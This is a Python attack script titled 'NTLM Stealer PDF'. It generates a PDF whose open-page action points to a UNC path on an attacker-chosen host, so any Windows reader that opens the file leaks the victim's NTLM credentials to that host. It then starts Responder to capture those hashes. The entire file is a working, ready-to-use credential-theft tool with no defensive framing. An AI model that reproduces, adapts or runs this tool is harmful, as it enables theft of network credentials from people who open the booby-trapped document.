#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import subprocess

responder = '/usr/sbin/responder'
interface = 'eth0'


def create_malpdf(filename, host):
    print("[*] Starting Process.. [*]")
    with open(filename, "wb") as file:  # Modo binario (wb)
        file.write(b'''
%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
       /O <<
          /F (''' + host.encode() + b'''test)
          /D [ 0 /Fit]
          /S /GoToE
          >>

       >>

       /Parent 2 0 R
       /Resources <<
            /Font <<
                /F1 <<
                    /Type /Font
                    /Subtype /Type1
                    /BaseFont /Helvetica
                    >>
                  >>
                >>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
    /Root 1 0 R
>>

%%EOF
''')


if __name__ == "__main__":
    try:
        print("NTLM Stealer PDF")

        if os.path.isfile(responder):
            print(f"Responder detected: {responder}")
        else:
            print("Responder not found..")
            responder = input("Please enter responder path (Default /usr/sbin/responder): \n") or responder

        host = input("Please enter Bad-PDF host IP: \n")
        filename = input("Please enter output file name: \n")
        interface = input("Please enter the interface name to listen (Default eth0): \n") or interface

        create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
        print(f"Bad PDF {filename} created")

        subprocess.Popen(responder + ' -I ' + interface + ' -wF', shell=True).wait()

    except KeyboardInterrupt:
        exit(0)
